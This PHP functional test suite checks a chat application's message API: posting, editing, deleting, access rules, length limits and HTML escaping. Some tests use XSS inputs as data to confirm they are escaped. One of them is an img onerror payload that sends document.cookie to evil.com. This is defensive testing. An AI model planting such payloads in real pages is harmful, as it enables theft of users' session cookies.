<?php

declare(strict_types=1);

namespace App\Tests\Functional\Api;

use App\Tests\Factory\ChannelFactory;
use App\Tests\Factory\ChannelMemberFactory;
use App\Tests\Factory\CommunityFactory;
use App\Tests\Factory\CommunityMemberFactory;
use App\Tests\Factory\MessageFactory;
use App\Tests\Factory\MessagePageFactory;
use App\Tests\Factory\UserFactory;
use App\Tests\Functional\ApiTestCase;
use Zenstruck\Foundry\Test\Factories;
use Zenstruck\Foundry\Test\ResetDatabase;

class MessageTest extends ApiTestCase
{
    use Factories;
    use ResetDatabase;

    /** @return array{\App\Entity\User, \App\Entity\Community, \App\Entity\Channel} */
    private function setupCommunityAndChannel(bool $privateChannel = false): array
    {
        $user = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('msg-community')->create();
        CommunityMemberFactory::createForUserAndCommunity($user, $community);
        $channelBuilder = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'general']);
        if ($privateChannel) {
            $channelBuilder = $channelBuilder->private();
        }
        $channel = $channelBuilder->create();
        ChannelMemberFactory::createForUserAndChannel($user, $channel);

        return [$user, $community, $channel];
    }

    public function testMemberCanSendMessage(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => 'Hello world'],
        ]);

        self::assertResponseStatusCodeSame(201);
        self::assertJsonContains(['text' => 'Hello world']);
    }

    public function testAnonymousCannotSendMessage(): void
    {
        $community = CommunityFactory::new()->withIdentifier('anon-msg')->create();
        ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'ch'])->create();

        $this->jsonClient()->request('POST', '/api/v1/communities/anon-msg/channels/ch/messages', [
            'json' => ['text' => 'Hello'],
        ]);

        self::assertResponseStatusCodeSame(401);
    }

    public function testNonMemberCannotSendToPrivateChannel(): void
    {
        $user = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('priv-msg')->create();
        CommunityMemberFactory::createForUserAndCommunity($user, $community);
        ChannelFactory::new()->inCommunity($community)->private()->with(['identifier' => 'locked'])->create();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/priv-msg/channels/locked/messages', [
            'json' => ['text' => 'Sneaky'],
        ]);

        self::assertResponseStatusCodeSame(404);
    }

    public function testSendingEmptyMessageReturns422(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => ''],
        ]);

        self::assertResponseStatusCodeSame(422);
    }

    public function testGetCurrentPageReturnsMessages(): void
    {
        [$user, , $channel] = $this->setupCommunityAndChannel();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        MessageFactory::new()->inPage($page)->withText('current page message one')->create();
        MessageFactory::new()->inPage($page)->withText('current page message two')->create();

        $response = $this->jsonClient($user)->request('GET', '/api/v1/communities/msg-community/channels/general/messages/current');

        self::assertResponseIsSuccessful();
        $data = $response->toArray();
        self::assertArrayHasKey('messages', $data);
        self::assertCount(2, $data['messages']);
        self::assertEqualsCanonicalizing(
            ['current page message one', 'current page message two'],
            array_column($data['messages'], 'text'),
        );
    }

    /**
     * A channel with no messages has no MessagePage row, so the service hands
     * back a transient placeholder. Querying with an unsaved entity used to
     * throw, which made every freshly created channel 500 on first open.
     */
    public function testGetCurrentPageOnAnEmptyChannelReturnsAnEmptyPage(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $response = $this->jsonClient($user)->request(
            'GET',
            '/api/v1/communities/msg-community/channels/general/messages/current',
        );

        self::assertResponseIsSuccessful();
        self::assertSame([], $response->toArray()['messages']);
    }

    public function testGetCurrentPageReturns401ForAnonymous(): void
    {
        $community = CommunityFactory::new()->withIdentifier('pub')->create();
        ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'ch'])->create();

        $this->jsonClient()->request('GET', '/api/v1/communities/pub/channels/ch/messages/current');

        self::assertResponseStatusCodeSame(401);
    }

    public function testAuthorCanEditMessage(): void
    {
        $user = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('edit-c')->create();
        CommunityMemberFactory::createForUserAndCommunity($user, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'edit-ch'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($user)->create();

        $this->jsonClient($user)->request('PATCH', '/api/v1/messages/'.$message->getId(), [
            'headers' => ['Content-Type' => 'application/merge-patch+json'],
            'json' => ['text' => 'Edited text'],
        ]);

        self::assertResponseIsSuccessful();
        self::assertJsonContains(['text' => 'Edited text']);
    }

    public function testNonAuthorCannotEditMessage(): void
    {
        $author = UserFactory::createOne();
        $other = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('edit-c2')->create();
        CommunityMemberFactory::createForUserAndCommunity($author, $community);
        CommunityMemberFactory::createForUserAndCommunity($other, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'edit-ch2'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($author)->create();

        $this->jsonClient($other)->request('PATCH', '/api/v1/messages/'.$message->getId(), [
            'headers' => ['Content-Type' => 'application/merge-patch+json'],
            'json' => ['text' => 'Hacked'],
        ]);

        self::assertResponseStatusCodeSame(403);
    }

    public function testAdminCanEditAnyMessage(): void
    {
        $admin = UserFactory::new()->admin()->create();
        $author = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('admin-edit')->create();
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'ch'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($author)->create();

        $this->jsonClient($admin)->request('PATCH', '/api/v1/messages/'.$message->getId(), [
            'headers' => ['Content-Type' => 'application/merge-patch+json'],
            'json' => ['text' => 'Admin edit'],
        ]);

        self::assertResponseIsSuccessful();
    }

    public function testAuthorCanDeleteMessage(): void
    {
        $user = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('del-c')->create();
        CommunityMemberFactory::createForUserAndCommunity($user, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'del-ch'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($user)->create();

        $this->jsonClient($user)->request('DELETE', '/api/v1/messages/'.$message->getId());

        self::assertResponseStatusCodeSame(204);
    }

    public function testNonAuthorCannotDeleteMessage(): void
    {
        $author = UserFactory::createOne();
        $other = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('del-c2')->create();
        CommunityMemberFactory::createForUserAndCommunity($author, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'del-ch2'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($author)->create();

        $this->jsonClient($other)->request('DELETE', '/api/v1/messages/'.$message->getId());

        self::assertResponseStatusCodeSame(403);
    }

    public function testSendingTooLongMessageReturns422(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => str_repeat('a', 10001)],
        ]);

        self::assertResponseStatusCodeSame(422);
    }

    public function testExactMaxLengthMessageIsAccepted(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => str_repeat('a', 10000)],
        ]);

        self::assertResponseStatusCodeSame(201);
    }

    public function testSendingMessageWithHtmlTagsSanitizesOnStore(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => 'Hello <script>alert("xss")</script> world'],
        ]);

        self::assertResponseStatusCodeSame(201);
        self::assertJsonContains(['text' => 'Hello &lt;script&gt;alert("xss")&lt;/script&gt; world']);
    }

    public function testSendingMessageWithCodeBlockPreservesHtmlInsideIt(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => "Example:\n```\n<script>bad()</script>\n```"],
        ]);

        self::assertResponseStatusCodeSame(201);
        self::assertJsonContains(['text' => "Example:\n```\n<script>bad()</script>\n```"]);
    }

    public function testEditingMessageWithHtmlTagsSanitizesOnStore(): void
    {
        $user = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('san-edit')->create();
        CommunityMemberFactory::createForUserAndCommunity($user, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'san-ch'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($user)->create();

        $this->jsonClient($user)->request('PATCH', '/api/v1/messages/'.$message->getId(), [
            'headers' => ['Content-Type' => 'application/merge-patch+json'],
            'json' => ['text' => '<img src="x" onerror="steal()"> updated'],
        ]);

        self::assertResponseIsSuccessful();
        self::assertJsonContains(['text' => '&lt;img src="x" onerror="steal()"&gt; updated']);
    }

    public function testWhitespaceOnlyMessageReturns422(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => '   '],
        ]);

        self::assertResponseStatusCodeSame(422);
    }

    public function testModeratorCanDeleteAnotherUsersMessage(): void
    {
        $author = UserFactory::createOne();
        $moderator = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('mod-del-c')->create();
        CommunityMemberFactory::createForUserAndCommunity($author, $community);
        CommunityMemberFactory::createForUserAndCommunity($moderator, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'mod-del-ch'])->create();
        ChannelMemberFactory::createForUserAndChannel($author, $channel);
        ChannelMemberFactory::createForUserAndChannel($moderator, $channel, \App\Enum\Channel\ChannelRole::Moderator);
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($author)->create();

        $this->jsonClient($moderator)->request('DELETE', '/api/v1/messages/'.$message->getId());

        self::assertResponseStatusCodeSame(204);
    }

    public function testSendingXssViaImgOnerrorIsSanitized(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $response = $this->jsonClient($user)->request('POST', '/api/v1/communities/msg-community/channels/general/messages', [
            'json' => ['text' => '<img src=x onerror=fetch("https://evil.com/"+document.cookie)>'],
        ]);

        self::assertResponseStatusCodeSame(201);
        $text = $response->toArray()['text'];
        // The tag must be escaped — no live angle-bracket opening tag remains.
        self::assertStringNotContainsString('<img', $text);
        self::assertStringStartsWith('&lt;img', $text);
    }

    public function testAdminCanDeleteAnyMessage(): void
    {
        $admin = UserFactory::new()->admin()->create();
        $author = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('admin-del')->create();
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'adm-ch'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($author)->create();

        $this->jsonClient($admin)->request('DELETE', '/api/v1/messages/'.$message->getId());

        self::assertResponseStatusCodeSame(204);
    }

    public function testMemberCanGetMessageInPublicChannel(): void
    {
        [$user, , $channel] = $this->setupCommunityAndChannel();
        // Create three sequential pages so the target sits at pageNumber=3
        // (page numbers are assigned by a listener, not via the factory).
        MessagePageFactory::new()->forChannel($channel)->create();
        MessagePageFactory::new()->forChannel($channel)->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->create();

        $response = $this->jsonClient($user)->request('GET', '/api/v1/messages/'.$message->getId());

        self::assertResponseIsSuccessful();
        $data = $response->toArray();
        self::assertSame(3, $data['pageNumber']);
        self::assertSame('msg-community', $data['communityIdentifier']);
        self::assertSame('general', $data['channelIdentifier']);
    }

    public function testAnonymousCanGetMessageInPublicChannel(): void
    {
        $community = CommunityFactory::new()->withIdentifier('pub-msg-get')->create();
        $channel = ChannelFactory::new()->inCommunity($community)->with(['identifier' => 'open'])->create();
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->create();

        $this->jsonClient()->request('GET', '/api/v1/messages/'.$message->getId());

        self::assertResponseIsSuccessful();
    }

    public function testNonMemberCannotGetMessageInPrivateChannel(): void
    {
        $author = UserFactory::createOne();
        $outsider = UserFactory::createOne();
        $community = CommunityFactory::new()->withIdentifier('priv-msg-get')->create();
        CommunityMemberFactory::createForUserAndCommunity($author, $community);
        CommunityMemberFactory::createForUserAndCommunity($outsider, $community);
        $channel = ChannelFactory::new()->inCommunity($community)->private()->with(['identifier' => 'vault'])->create();
        ChannelMemberFactory::createForUserAndChannel($author, $channel);
        $page = MessagePageFactory::new()->forChannel($channel)->create();
        $message = MessageFactory::new()->inPage($page)->byUser($author)->create();

        $this->jsonClient($outsider)->request('GET', '/api/v1/messages/'.$message->getId());

        self::assertResponseStatusCodeSame(403);
    }

    public function testGetUnknownMessageReturns404(): void
    {
        [$user] = $this->setupCommunityAndChannel();

        $this->jsonClient($user)->request('GET', '/api/v1/messages/00000000-0000-0000-0000-000000000000');

        self::assertResponseStatusCodeSame(404);
    }
}
